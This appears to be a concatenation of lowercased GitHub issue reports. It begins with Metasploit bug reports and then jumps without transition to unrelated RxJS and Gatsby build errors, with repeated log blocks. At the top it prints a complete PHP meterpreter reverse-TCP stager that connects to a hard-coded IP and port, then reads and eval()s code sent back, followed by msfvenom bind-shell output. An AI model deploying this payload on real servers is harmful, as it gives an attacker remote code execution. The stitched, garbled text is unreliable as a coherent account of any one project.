/*<?php /**/ error_reporting(0); $ip = \'192.168.1.73\'; $port = 4444; if (($f = \'stream_socket_client\') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = \'stream\'; } elseif (($f = \'fsockopen\') && is_callable($f)) { $s = $f($ip, $port); $s_type = \'stream\'; } elseif (($f = \'socket_create\') && is_callable($f)) { $s = $f(af_inet, sock_stream, sol_tcp); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = \'socket\'; } else { die(\'no socket funcs\'); } if (!$s) { die(\'no socket\'); } switch ($s_type) { case \'stream\': $len = fread($s, 4); break; case \'socket\': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("nlen", $len); $len = $a[\'len\']; $b = \'\'; while (strlen($b) < $len) { switch ($s_type) { case \'stream\': $b .= fread($s, $len-strlen($b)); break; case \'socket\': $b .= socket_read($s, $len-strlen($b)); break; } } $globals[\'msgsock\'] = $s; $globals[\'msgsock_type\'] = $s_type; eval($b); die(); ~/tools/pentest/metasploit-framework $ ./msfvenom -p php/bind_php
no platform was selected, choosing msf::module::platform::php from the payload
no arch selected, selecting arch: php from the payload
no encoder or badchars specified, outputting raw payload
payload size: 2454 bytes @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0); $mxqaaw=@ini_get('disable_functions'); if(!empty($mxqaaw)){ $mxqaaw=preg_replace('/[, ]+/', ',', $mxqaaw); $mxqaaw=explode(',', $mxqaaw); $mxqaaw=array_map('trim', $mxqaaw); }else{ $mxqaaw=array(); }
[snip] @socket_write($msgsock,$o,strlen($o)); } @socket_close($msgsock);
- exploits does not handle consistently these tags : in modules/exploits/unix/webapp/xoda_file_upload : ``` ruby post_data << "<?php " post_data << payload.encoded post_data << " ?>\ \ "
``` while in modules/exploits/unix/webapp/ wp_wysija_newsletters_upload.rb payload.encoded is used directly : ``` ruby content = { ::file.join(theme_name, 'style.css') => '', ::file.join(theme_name, payload_name) => payload.encoded }
``` manually adding the php tags to all upload exploit would fix this problem as the meterpreter uses the comment trick to avoid problem is the tag is added twice, but it would be better to have an option when getting the payload to add it (or not)
any idea on how to do this properly?
## system stuff
hangs on 'responding with 10 exploits' and returns nothing [_] handling '/autopwn'
[_] handling '/autopwn?sessid=v2luzg93cya4lje6dw5kzwzpbmvkonvuzgvmaw5lzdp1bmrlzmluzwq6dw5kzwzpbmvkomvulvvtong4njpgaxjlzm94ojm1lja6'
[_] javascript report: windows 8.1:undefined:undefined:undefined:undefined:en-us:x86:firefox:35.0:
[_] reporting: {"os.product"=>"windows 8.1", "os.language"=>"en-us", "os.arch"=>"x86", "os.certainty"=>"0.7"}
[*] responding with 10 exploits
note that the text files are created, the relevant fields however are encrypted.
[mini stacktrace](
## system stuff kali linux (latest)
the stage encoding fails and falls back to no encoding
the issue is that the x64/xor encoder module isn't implementing the preserve registers functionality
the code that calls the stage encoder requires that this functionality be present
since it isn't, stage encoding fails and falls back to the no encoding
i\'ve implemented a temp fix by inserting the code below into the /usr/share/metasploit-framework/modules/encoders/x64/xor.rb file, right above the line "def decoder_stub(state)", so that it looks as follows: -----snip---- def can_preserve_registers? true end def decoder_stub( state )
-----snip----- it seems there are a couple options to fix (probably more, but these are a few):
1) don't require that encoder modules have to be able to preserve registers (maybe a user option?)
2) implement preserve register functionality in the x64/xor stage encoder module
### i installed metasploit with: installed via fresh pull from github
### os kali rolling, fully updated
only stageless payloads work
staged payloads crash the host proc
any help would be appreciated.
exception with every connection attempt: [-] exception handling request: undefined local variable or method `expires' for #<msf::modules::mod617578696c696172792f7365727665722f62726f777
365725f6175746f70776e32::metasploitmodule: > you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ```
/opt/metasploit/lib/msf/core/exploit/remote/browser_exploit_server.rb:524:in `cookie_header'
/opt/metasploit/lib/msf/core/exploit/remote/browser_exploit_server.rb:557:in `on_request_uri'
/opt/metasploit/lib/msf/core/exploit/browser_autopwn2.rb:713:in `on_request_uri'
/opt/metasploit/lib/msf/core/exploit/http/server.rb:159:in `block in start_service'
/opt/metasploit/lib/rex/proto/http/handler/proc.rb:38:in `call'
/opt/metasploit/lib/rex/proto/http/handler/proc.rb:38:in `on_request'
/opt/metasploit/lib/rex/proto/http/server.rb:364:in `dispatch_request'
/opt/metasploit/lib/rex/proto/http/server.rb:298:in `on_client_data'
/opt/metasploit/lib/rex/proto/http/server.rb:157:in `block in start'
/opt/metasploit/lib/rex/io/stream_server.rb:48:in `call'
/opt/metasploit/lib/rex/io/stream_server.rb:48:in `on_client_data'
/opt/metasploit/lib/rex/io/stream_server.rb:192:in `block in monitor_clients'
/opt/metasploit/lib/rex/io/stream_server.rb:190:in `each'
/opt/metasploit/lib/rex/io/stream_server.rb:190:in `monitor_clients'
/opt/metasploit/lib/rex/io/stream_server.rb:73:in `block in start'
/opt/metasploit/lib/rex/thread_factory.rb:22:in `call'
/opt/metasploit/lib/rex/thread_factory.rb:22:in `block in spawn'
/opt/metasploit/lib/msf/core/thread_manager.rb:100:in `call'
/opt/metasploit/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[05/24/2016 15:52:42] [e(0)] rex: proc::on_request: nameerror: undefined local variable or method `expires' for #<msf::modules::mod617578696c696172792f7365727665722f62726f777365725f6175746f70776e32::metasploitmodule: >
## system stuff
[16:28:28] <alientrooper> [-] error running command upload: nomethoderror undefined method `exists?' for #class:
msf says `[*] xx.xx.xx.xx web_delivery - delivering payload` but then powershell crashes on the target machine and a session is not established
in the packet capture, the target sends the get to msf and gets a 200 back with the second powershell command, but then gets a rst, ack
i cannot find any related activity in framework.log
## system stuff
![image]( error displayed as the screenshot.
## system stuff
since the is_uac_enabled? check doesn\'t contain windows 10, the script always returns "false" like 93 should contain "10" in the if:
`if winversion =~ /windows (vista|7|8|2008|2012|10)/`
## system stuff
this error is repeated many times in the console: currently, active record recognizes the table in the string, and knows to join the comments table to the query, rather than loading comments in a separate query
however, doing this without writing a full-blown sql parser is inherently flawed
since we don't want to write an sql parser, we are removing this functionality
from now on, you must explicitly tell active record when you are referencing a table from a string: ```
post.includes(:comments).where("comments.title = \'foo\'").references(:comments)
``` followed by:
# hosts address mac name os_name os_flavor os_sp purpose info comments ---
## system stuff
program exit's and doesn't open a reverse shell to the domain (no traffic went to host
no traffic seen by wireshark on the port)
## system stuff
only tcpclientchannels return a selectable io abstraction when localhost is a remote address.
other calls can return objects with completely different behaviors and possible a file descriptor.
## symptomatic expression stateless socket consumers in rex and above cannot reliably serve responses to requests as the individual server classes for dhcp, tftp, and dns (#6611) implement io.select on the udp listener to determine if it has data available
## solution path
#6292 moves stream abstraction functionality into simpler socket abstractions which mix into gram and stream abstractions providing their own transport-specific objects and semantics in initialisers and send/recv behaviors
similarly, channels in the post namespace have been restructured to create per-transport channel types allowing for the socket abstraction prior to implementing those channels as pivot overlays for the transport in question (udp/tcp)
details of the work are logged in the pr itself.
getting error about the file format is not correct with the current pdf
### os windows 7 32bit
when `firstvaluefrom()` subscribes to an observable it behaves subtly different than `source.pipe(first()).topromise()` because it doesn't unsubscribe from source until after it is done synchronously emitting events.
while updating google i got compilation errors in some ngrx files related to dematerialize
the files and their errors are as follows:
#l157
ts2345: argument of type 'operatorfunction<observablenotification<any>, any>' is not assignable to parameter of type 'operatorfunction<notification<outputaction | erroraction | completeaction | unsubscribeaction>, any>'
type 'observablenotification<any>' is not assignable to type 'notification<outputaction | erroraction | completeaction | unsubscribeaction>'
type 'errornotification' is missing the following properties from type 'notification<outputaction | erroraction | completeaction | unsubscribeaction>': hasvalue, observe, do, accept, toobservable 183 dematerialize(), ~~~~~~~~~~~~~~~
``` #l71
ts2345: argument of type 'operatorfunction<observablenotification<any>, any>' is not assignable to parameter of type 'operatorfunction<notification<action>, any>'
type 'observablenotification<any>' is not assignable to type 'notification<action>'
type 'errornotification' is missing the following properties from type 'notification<action>': hasvalue, observe, do, accept, toobservable 87 dematerialize() ~~~~~~~~~~~~~~~
import { interval, subject } from 'rxjs'; import { buffertime, takewhile, tap } from 'rxjs/operators'; const subject = new subject<number>() interval(100).pipe(tap(n => subject.next(n))).subscribe(); const log = batch => { // settimeout(()=>{ subject.next(99) // }) console.log(batch)
} const source = subject.pipe( takewhile(x => x < 100), buffertime(1000), tap(batch => log(batch))
); source.subscribe();
``` `99` shows up at end of each array that buffertime emits, it should not be possible for an operator that comes later to modify a value a previous operator emits
it should show up at the start of the 2nd buffer onwards
discovered while unit testing code that pushes onto a buffer in a jest mock callback that was being used in a side effect, after a buffertime().
`sharereplay` only emits the latest `buffersize` values on the initial subscription when the source is synchronous.
creating a stream in one project, and using it in another can prevent the process from exiting.
when instantiating a subscription and passing a callback, that callback is saved as `this._unsubscribe` of the `subscription` object: #l43 when unsubscribing that subscription, the function is called, but not nulled out afterwards: #l79 this means that if it did some manual resource cleanup like closing a messageport, that messageport still can't be garbage-collected, because the callback, and therefor the subscription, still holds a reference to it
this is different from subscriptions added via `add()`, which are correctly de-referenced: #l66
when you reuse a pipe with publish or publishreplay all uses of the pipe share the same instance of connectableobservable.
which causes the connection to connect when the other one connected and gets data from the other source
const pipeline = pipe( map((x: number) => x * x), publish(),
); const obs1 = src1.pipe(pipeline);
const obs2 = src2.pipe(pipeline); obs1.subscribe(d => console.log('sub 1', d));
obs2.subscribe(d => console.log('i should not be running', d)); obs1.connect();
``` this is what you get on the console ```
i should not be running 1
i should not be running 4
i should not be running 9
i should not be running 16
i should not be running 25
`obs2` which was never connected has been connected and it's also connected to the wrong source.
the observable is never completed after the last take.
we noticed that finalize is not called at the end of a pipe, in combination with concatmap.
in the sample code below, the typeerror is not caught in the catcherror callback, but thrown globally
we can not detect the error in the observable stream and in nodejs environment this error can cause the whole application to shut down
(if the provided mergemap callback throws an error instead of returning null, the error is handled correctly.)
when using `single(()=>false)` on an **empty sequence** there is an error correctly thrown notifying about `no elements in sequence`
but when using `single(()=>false)` on a single-element or multiple-element sequence there is one `undefined` value emitted (unlike `first(()=>false)` behaviour ).
given project `a` and `b`
when `a` subscribe to a stream from `b`, the `finalize` operator doesn't get called
the below script outputs:
a finalized c
when an observable created with fromfetch is unsubscribed and then resubscribed, it immediately throws aborterror.
when using the delay operator multiple times, and each time passing a date object into it, subsequent delay operators seem to accumulate the date differential from previous delay operators
see reproduction url for a code example.
catcherror returns the data emitted only by atomic observables, who return the value immediately, rather that waiting for the target observable to complete.
- rxjs@5 switchmap [has resultselector argument]( #l58)
- rxjs@6 switchmap [has resultselector argument]( #l84) **but rxjs-compat@6** switchmap has no [resultselector argument]( #l55) why?
behaviorsubject.getvalue() always returns initial value if subscribed to an observable from webpack library while the observable is emitting new values.
the source observable doesn't unsubscribe when unsubscribing an observable that came from a library that returns rxjs observables
the libray was bundled with webpack.
after component gets destroyed, its reference stays alive, because the fact that i subscribe to bigger scoped observable (for example route.params) and switch it (via switchmap) to the observable piped with sharereplay operator
after taking heap snapshots via chrome devtools, i noticed that reference retainers mentioned sharereplay operator
if i use publishreplay and refcount instead of sharereplay problem is fixed, that's why i think sharereplay has an issue
please have a look at code on github and screen shots for better understanding the issue
(code explains issue better than description)
you can see code sample below
event after reviewing #3336, issue still remains with sharereplay.
the default behaviour of using
import { observable } from "rxjs";
``` it will be using the source file in `./node_modules/rxjs/_esm5/index.js` because of the `module` defined in `./node_modules/rxjs/package.json` but if we are using some other stuffs like
import { fromfetch } from "rxjs/fetch";
``` it will be using the source file in `./node_modules/rxjs/fetch/index.js` this is causing a lot of bugs which i filed it here i have to use
import { fromfetch } from "rxjs/_esm5/fetch";
``` then everything works fine
currently, there seems to be 2 similar ways to organize requestanimationframe based observables:
1) `interval(0, animationframescheduler)`
2) `of(0, animationframescheduler).pipe(repeat())` however first approach, using `interval` apparently emits twice each frame
see demo on stackblitz.
`windowtime` for some parameter values throws ```
error in /turbo_modules/rxjs@6.5.2/internal/operators/windowtime.js (105:27)
cannot read property 'closed' of undefined
``` couldn't figure out the exact relation between parameters, but basically it reliably broke for me with `windowtimespan > windowcreationinterval && maxwindowsize > 2`,
when a `race` is won by a source observable that completes or errors synchronously, the implementation continues to subscribe to subsequent source observables
this does not happen if the source observable that wins the race does so by emitting a value notification.
when using `defer` with a `() => void` factory, the return type will be `observable<any>`.
`fromfetch` seems to fail with `aborterror` when i would expect it to succeed.
after #4640, `forkjoin(promise)` throws an error > you provided 'null' where a stream was expected
you can provide an observable, promise, array, or iterable
note that this only happens if you provide `forkjoin` with a single argument of type `promise`.
subscribing to the result of a `race` of two different types of observables results in a type error.
6.4.0 introduced a const enum: [`notificationkind`]( #l7-l11)
however, that enum is [not exported]( #l26-l27): ```ts
/* notification */
export { notification } from './internal/notification';
``` that means that it's not possible to create a `notification` instance (without resorting to an `as any` assertion)
this was a breaking change for me, as the tests for `rxjs-spy` need to be able to create `notification` instances
(it\'s also a breaking change because current calls to the constructor - like `new notification("n", "alice")` - are now invalid.)
`const a = iif(()=> true) `
the above code infer `observable<{}>`
`pairs` observable is incorrectly inferred
with the example below the type infers as `observable<[string, {}]>` var obj = { foo: 1, bar: 2, baz: 3
}; var source = pairs(obj);
if the websocketsubject is unsubscribed before the connection is in the open state (readystate = 1), it does not close the socket connection, and resets the subject state
this happens both from calling unsubscribe directly on the subject, and when the last subscriber calls unsubscribe on their subscription.
#l279
#l290
umd rxjs file will inject global variable `$jscomp` to global/window.
the `from` function in rxjs 6.3.3 does not seem able to adapt `xstream` and `most` while the older rxjs 5 `observable.from` was able to
the following error is reproduced in both cases: > typeerror: you provided an invalid object where a stream was expected
you can provide an observable, promise, array, or iterable
both `xstream` and `most` provide `symbol` polyfills:
- #l1250
- #l584 additional testing has confirmed:
- this issue does not occur in `webpack` but it does in `node`, `jest`, and `browserify`.
- the order of import seems to matter.
stack traces are no longer recorded on rxjs errors as of 6.3.0.
currently subscription isn't removed from **observers** array after unsubscribe, both with takeuntil() and unsubscribe().
currently, if you pass `observer, undefined, undefined` to `subscribe` you get a build error.
given this code: ``` ts
import { observable, of, operatorfunction, timer } from 'rxjs';
import { catcherror, concat, mergemap, mergemapto, startwith } from 'rxjs/operators'; enum state { loading = 'loading', error = 'error',
} const ajax$ = new observable<state>(subscriber => { settimeout(() => { subscriber.error('foo'); subscriber.complete(); }, 3000);
}).pipe( catcherror(_error => of(state.error)), startwith(state.loading),
); const delayedrepeatwhenerror = (): operatorfunction<state, state> => state$ => state$.pipe( mergemap(state => { const currentstate$ = of(state); return state === state.error ? currentstate$.pipe(concat(timer(3000).pipe(mergemapto(state$)))) : currentstate$; }), ); ajax$.pipe(delayedrepeatwhenerror()).subscribe(console.log);
``` the output is as expected: ```
``` however, if the observable is wrapped and then subscribed to, the output is different and not as expected
code: ``` ts
const wrappedajax$ = new observable<state>(subscriber => { const subscription = ajax$.subscribe(subscriber); return () => { subscription.unsubscribe(); };
}); wrappedajax$.pipe(delayedrepeatwhenerror()).subscribe(console.log);
``` output: ```
``` this seems to be a regression from one of the releases after 6.2.2, as that's what i just upgraded from.
currently if you nest a `concatmap` inside of a `concatmap`, and the source completes, the inner most concatmap will not forward along values.
after #3945, the following is now a type error: ```typescript
of(1, 2, 3).pipe(...[map((x) => x)]); error ts2557: expected at least 0 arguments, but got 0 or more.
``` arguably, this is ts error as witnessed by the odd error msg.
array.from( \\<set\\> ) return empty.
rxjs.umd.min.js version >=6
es6-shim.js v0.35.3
when there are no more subscriptions to a `websocketsubject`, then the underlying `websocket` is closed
if you then create a new subscription on the `websocketsubject`, before the `onclose` of the previous `websocket` has fired, then the newly created `websocket` will never be closed
if you combine this with the `multiplex` function, then some subscribe/unsubscribe messages will not be send as well.
when an object that is "array like" and has observable symbol, observable.from uses `array like` observable.from mechanism before the observable symbol interop
this is a problem in microstates because the observable symbol provides the proper mechanism to make a microstate observable
treating it like an array does something very funky.
error: can't walk dependency graph: cannot find module 'cypress-axe' from '/.../gatsby/examples/using-cypress/cypress/support' required by /.../gatsby/examples/using-cypress/cypress/support/index.js
``` ### after updating cypress 1
run `npm i axe-core@latest cypress-axe@latest cypress@latest`
run `npm run test:e2e`
click the accessibility test when cypress window opens
#### expected result cypress should run accessibility tests without issue
#### actual result ```
exports is not defined because this error occurred during a before each hook we are skipping the remaining tests in the current suite: accessibility tests
images are not optimized and thus not bundled in the production build
the urls are built, however, and return 404 html page.
`webpackerror: referenceerror: react is not defined`
get the following error failed to compile
there was an error in your graphql query: field "image" must not have a selection since type "string" has no subfields
this can happen if you e.g
accidentally added { } to the field "image"
if you didn\'t expect "image" to be of type "string" make sure that your input source and/or plugin is correct
however, if you expect "value" to exist, the field might be accessible in another subfield
please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "undefined": #creating-type-definitions file: /users/patrickfalconer/desktop/msu-swim/src/templates/product-page.js there was an error in your graphql query: field "image" must not have a selection since type "string" has no subfields
this can happen if you e.g
accidentally added { } to the field "image"
if you didn\'t expect "image" to be of type "string" make sure that your input source and/or plugin is correct
however, if you expect "value" to exist, the field might be accessible in another subfield
please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "undefined": #creating-type-definitions file: /users/patrickfalconer/desktop/msu-swim/src/templates/product-page.js there was an error in your graphql query: field "image" must not have a selection since type "string" has no subfields
this can happen if you e.g
accidentally added { } to the field "image"
if you didn\'t expect "image" to be of type "string" make sure that your input source and/or plugin is correct
however, if you expect "value" to exist, the field might be accessible in another subfield
please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "undefined": #creating-type-definitions file: /users/patrickfalconer/desktop/msu-swim/src/templates/product-page.js
![image](
got the above-mentioned error
the following screen shows up:
![image](
the site serves with multiple errors.
gatsby detects a `.cache` directory.
``` error #98124 webpack generating ssr bundle failed can't resolve 'gatsby-theme-blog/src/gatsby-plugin-theme-ui/index' in '<my-repository>\\src\\gatsby-plugin-theme-ui' if you're trying to use a package make sure that 'gatsby-theme-blog/src/gatsby-plugin-theme-ui/index' is installed
if you're trying to use a local file make sure that the path is correct
``` i checked the folder "gatsby-plugin-theme-ui", but it had only the file named "conponents.js".
there was no file named "index.js".
hot reload does not work.
getting error
nothing appens when i click the button `increase counter`
if i refresh the page manually (f5) the counter show the correct value.
sometimes your changes are not shown.
when start the application on development it throws this
error #11321 plugin "gatsby-plugin-prefetch-google-fonts" threw an error while running the onprebootstrap lifecycle: enoent: no such file or directory, stat \'.cache/google-fonts//fonts\' error: enoent: no such file or directory, stat \'.cache/google-fonts//fonts\' - api-runner-node.js:460 promise.catch.decorateevent.pluginname [project]/[gatsby]/src/utils/api-runner-node.js:460:9 - from previous event: - api-runner-node.js:459 [project]/[gatsby]/src/utils/api-runner-node.js:459:14 - timers.js:461 processimmediate internal/timers.js:461:21 - from previous event: - api-runner-node.js:451 [project]/[gatsby]/src/utils/api-runner-node.js:451:13 - from previous event: - api-runner-node.js:367 module.exports [project]/[gatsby]/src/utils/api-runner-node.js:367:3 - initialize.ts:413 initialize [project]/[gatsby]/src/services/initialize.ts:413:9
the result after refresh the browser is a mix of the base page and the profile page
"hello world!" text is seen for a while and then a blank page is seen
types for `actions.createschemacustomization` are missing.
nodes are not loading using gatsby-source- shopify cannot open graphql
error: the result of this staticquery could not be fetched.
node_modules/gatsby/index.d.ts:29:36 - error ts2307: cannot find module './src/bootstrap/load-plugins/types' or its corresponding type declarations
29 export { iplugininfooptions } from "./src/bootstrap/load-plugins/types"
receive the error: ```
error: the result of this staticquery could not be fetched
this is likely a bug in gatsby and if refreshing the page does not fix it, please open an issue in
``` along with the console output: > > gatsby-browser-entry.js:77 uncaught error: the result of this staticquery could not be fetched.
> > this is likely a bug in gatsby and if refreshing the page does not fix it, please open an issue in
> at usestaticquery (gatsby-browser-entry.js:77)
> at header (header.tsx:32)
> at renderwithhooks (react-dom.development.js:14804)
> at mountindeterminatecomponent (react-dom.development.js:17483)
> at beginwork (react-dom.development.js:18597)
> at htmlunknownelement.callcallback (react-dom.development.js:189)
> at object.invokeguardedcallbackdev (react-dom.development.js:238)
> at invokeguardedcallback (react-dom.development.js:293)
> at beginwork$1 (react-dom.development.js:23204)
> at performunitofwork (react-dom.development.js:22158)
> at workloopsync (react-dom.development.js:22131)
> at performsyncworkonroot (react-dom.development.js:21757)
> at scheduleupdateonfiber (react-dom.development.js:21189)
> at updatecontainer (react-dom.development.js:24374)
> at react-dom.development.js:24759
> at unbatchedupdates (react-dom.development.js:21904)
> at legacyrendersubtreeintocontainer (react-dom.development.js:24758)
> at render (react-dom.development.js:24841)
> at app.js:115
no generated html file.
new content isn't shown (without a refresh).
$ gatsby new gatsby-simplefolio-2
info creating new site from git:
cloning into 'gatsby-simplefolio-2'...
remote: enumerating objects: 70, done.
remote: counting objects: 100% (70/70), done.
remote: compressing objects: 100% (58/58), done.
remote: total 70 (delta 3), reused 48 (delta 0), pack-reused 0
unpacking objects: 100% (70/70), 7.24 mib | 528.00 kib/s, done.
?[32msuccess?[39m created starter directory layout
?[34minfo?[39m installing packages...
npm warn deprecated request@2.88.2: request has been deprecated, see
npm warn deprecated @hapi/joi@15.1.1: joi is leaving the @hapi organization and moving back to 'joi' (
npm warn deprecated eslint-loader@2.2.1: this loader has been deprecated
please use eslint-webpack-plugin
npm warn deprecated har-validator@5.1.5: this library is no longer supported
npm warn deprecated @hapi/bourne@1.3.2: this version has been deprecated and is no longer supported or maintained
npm warn deprecated @hapi/address@2.1.4: this version has been deprecated and is no longer supported or maintained
npm warn deprecated @hapi/topo@3.1.6: this version has been deprecated and is no longer supported or maintained
npm warn deprecated @hapi/hoek@8.5.1: this version has been deprecated and is no longer supported or maintained
npm warn deprecated chokidar@2.1.8: chokidar 2 will break on node v14+
upgrade to chokidar 3 with 15x less dependencies.
npm warn deprecated @hapi/formula@2.0.0: this version has been deprecated and is no longer supported or maintained
npm warn deprecated fsevents@1.2.13: fsevents 1 will break on node v14+ and could be using insecure binaries
upgrade to fsevents 2.
npm warn deprecated core-js@2.6.11: core-js@<3 is no longer maintained and not recommended for usage due to the number of issues
please, upgrade your dependencies to the actual version
of core-js@3.
npm warn deprecated resolve-url@0.2.1: #deprecated
npm warn deprecated urix@0.1.0: please see #deprecated > bufferutil@4.0.1 install c:\\users\\abhik\\documents\\gatsby practice & projects\\gatsby-simplefolio-2\ ode_modules\\bufferutil
> node-gyp-build 'projects\\gatsby-simplefolio-2\ ode_modules\\.bin\\' is not recognized as an internal or external command,
operable program or batch file.
internal/modules/cjs/loader.js:883 throw err; ^ error: cannot find module 'c:\\users\\abhik\\documents\ ode-gyp-build\\bin.js' at function.module._resolvefilename (internal/modules/cjs/loader.js:880:15) at function.module._load (internal/modules/cjs/loader.js:725:27) at function.executeuserentrypoint [as runmain] (internal/modules/run_main.js:72:12) at internal/main/run_main_module.js:17:47 { code: 'module_not_found', requirestack: []
npm warn optional skipping optional dependency: fsevents@^1.2.7 (node_modules\\babel-plugin-add-module-exports\ ode_modules\\chokidar\ ode_modules\\fsevents):
npm warn notsup skipping optional dependency: unsupported platform for fsevents@1.2.13: wanted {"os":"darwin","arch":"any"} (current: {"os":"win32","arch":"x64"})
npm warn optional skipping optional dependency: fsevents@~2.1.2 (node_modules\\chokidar\ ode_modules\\fsevents):
npm warn notsup skipping optional dependency: unsupported platform for fsevents@2.1.3: wanted {"os":"darwin","arch":"any"} (current: {"os":"win32","arch":"x64"})
npm warn notsup unsupported engine for watchpack-chokidar2@2.0.0: wanted: {"node":"<8.10.0"}
(current: {"node":"14.14.0","npm":"6.14.8"})
npm warn notsup not compatible with your version of node/npm: watchpack-chokidar2@2.0.0
npm warn bootstrap@4.5.3 requires a peer of jquery@1.9.1 - 3 but none is installed
install peer dependencies yourself.
npm warn bootstrap@4.5.3 requires a peer of popper.js@^1.16.1 but none is installed
you must install peer dependencies yourself.
npm warn @typescript-eslint/eslint-plugin@2.34.0 requires a peer of eslint@^5.0.0 || ^6.0.0 but none is installed
you must install peer dependencies yourself.
npm warn @typescript-eslint/parser@2.34.0 requires a peer of eslint@^5.0.0 || ^6.0.0 but none is installed
you must install peer dependencies yourself.
npm warn eslint-config-react-app@5.2.1 requires a peer of eslint@6.x but none is installed
you must install peer dependencies yourself.
npm warn eslint-config-react-app@5.2.1 requires a peer of eslint-plugin-react-hooks@1.x || 2.x but none is installed
you must install peer dependencies yourself.
npm warn eslint-loader@2.2.1 requires a peer of eslint@>=1.6.0 <7.0.0 but none is installed.
you must install peer dependencies yourself.
npm warn tsutils@3.17.1 requires a peer of typescript@>=2.8.0 || >= 3.2.0-dev || >= 3.3.0-dev || >= 3.4.0-dev || >= 3.5.0-dev || >= 3.6.0-dev || >= 3.6.0-beta || >= 3.7.0-dev || >= 3.7.0-beta but none is installed
you must install peer dependencies yourself.
npm warn acorn-dynamic-import@4.0.0 requires a peer of acorn@^6.0.0 but none is installed
you must install peer dependencies yourself.
npm warn theme-ui@0.2.52 requires a peer of @mdx-js/react@^1.0.0 but none is installed
you must install peer dependencies yourself
npm err! code elifecycle
npm err! errno 1
npm err! bufferutil@4.0.1 install: `node-gyp-build`
npm err! exit status 1
npm err! failed at the bufferutil@4.0.1 install script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
npm err! c:\\users\\abhik\\appdata\ oaming\ pm-cache\\_logs\\2020-10-19t12_48_11_989z-debug.log error command failed with exit code 1: npm install error: command failed with exit code 1: npm install - error.js:56 makeerror [npm]/[gatsby-cli]/[execa]/lib/error.js:56:11 - index.js:114 handlepromise [npm]/[gatsby-cli]/[execa]/index.js:114:26 - task_queues.js:93 processticksandrejections internal/process/task_queues.js:93:5 - init-starter.js:142 install [npm]/[gatsby-cli]/lib/init-starter.js:142:7 - init-starter.js:209 clone [npm]/[gatsby-cli]/lib/init-starter.js:209:3 - init-starter.js:350 initstarter [npm]/[gatsby-cli]/lib/init-starter.js:350:5 - create-cli.js:430 [npm]/[gatsby-cli]/lib/create-cli.js:430:7
a) `rangeerror: maximum call stack size exceeded`
b) `typeerror: cannot read property 'internal' of null`
`typeerror: onrejected is not a function` message
this is because an error object is passed in as a parameter to the library, not a function to handle the error.
the navigation appears to be unstyled, although other components on the page work as expected
by either clicking home, or by navigating directly to the navigation styling will load and display properly throughout the site.
error #10123 config we encountered an error while trying to load your site's gatsby-config
please fix the error and try again
typeerror: "gatsby-plugin-sitemap" is not a function - gatsby-config.js:22 object.<anonymous> f:/holdyourlight/gatsby-site/gatsby-config.js:22:5 - v8-compile-cache.js:178 module._compile [gatsby-site]/[v8-compile-cache]/v8-compile-cache.js:178:30 - loader.js:947 object.module._extensions..js internal/modules/cjs/loader.js:947:10 - loader.js:790 module.load internal/modules/cjs/loader.js:790:32 - loader.js:703 function.module._load internal/modules/cjs/loader.js:703:12 - loader.js:830 module.require internal/modules/cjs/loader.js:830:19 - v8-compile-cache.js:159 require [gatsby-site]/[v8-compile-cache]/v8-compile-cache.js:159:20 - get-config-file.js:33 getconfigfile [gatsby-site]/[gatsby]/dist/bootstrap/get-config-file.js:33:20 - index.js:128 module.exports [gatsby-site]/[gatsby]/dist/bootstrap/index.js:128:46 - build.js:90 build [gatsby-site]/[gatsby]/dist/commands/build.js:90:36 - create-cli.js:174 [gatsby-site]/[gatsby]/[gatsby-cli]/lib/create-cli.js:174:14 - create-cli.js:101 [gatsby-site]/[gatsby]/[gatsby-cli]/lib/create-cli.js:101:24 - create-cli.js:35 object.handler [gatsby-site]/[gatsby]/[gatsby-cli]/lib/create-cli.js:35:19 - command.js:238 object.runcommand [gatsby-site]/[gatsby]/[yargs]/lib/command.js:238:44 - yargs.js:1063 object.parseargs [as _parseargs] [gatsby-site]/[gatsby]/[yargs]/yargs.js:1063:30 - yargs.js:566 object.parse [gatsby-site]/[gatsby]/[yargs]/yargs.js:566:2 5 not finished open and validate gatsby-configs -
npm err! code elifecycle
npm err! errno 1
npm err! gatsby-starter-default@0.1.0 build: `gatsby clean && gatsby build`
npm err! exit status 1
``` error #98124 webpack generating ssr bundle failed can't resolve 'react/jsx-runtime.js' in '/users/joetaylor/documents/www/joebentaylor/.cache' if you're trying to use a package make sure that 'react/jsx-runtime.js' is installed
if you're trying to use a local file make sure that the path is correct
file: .cache/develop-static-entry.js
see description.
i'm getting the error: `typeerror: cannot read property '[component]' of undefined`
url/link was output as ` `, with both the protocol (`http` instead of `https`) and the port (`61978` instead of `8080`) incorrect
### discussion problem is [here]( #l220)
it looks like the value of `program.port` is being used instead of `program.proxyport`, and `program.ssl` is being used instead of `program.https`
looks like this is using an [undocumented]( #oncreatedevserver) `store` property passed into oncreatedevserver.
there are ssl errors.
the following error message is printed: ```
generating development javascript bundle failed invalid options object
postcss loader has been initialized using an options object that does not match the api schema
- options has an unknown property 'plugins'
these properties are valid: object { postcssoptions?, execute?, sourcemap? }
`<content:encoded><div></div></content:encoded>` is returned,
error #11328 a page component must export a react component for it to be valid
please make sure this file exports a react component: undefined not finished createpagesstatefully - 0.068s
error: command failed: c:\\windows\\system32\\cmd.exe /s /c "autoreconf -fiv"
'autoreconf' is not recognized as an internal or external command,
operable program or batch file.
got the following error: latest error:
bash: gatsby: command not found
the query results are sorted using the original value of date.
it doesn't.
you always end up back at the top of the page.
development bundle building fails: ```
error in /home/gatsby-project/node_modules/gatsby-cli/lib/reporter/redux/types.d.ts(3,31):
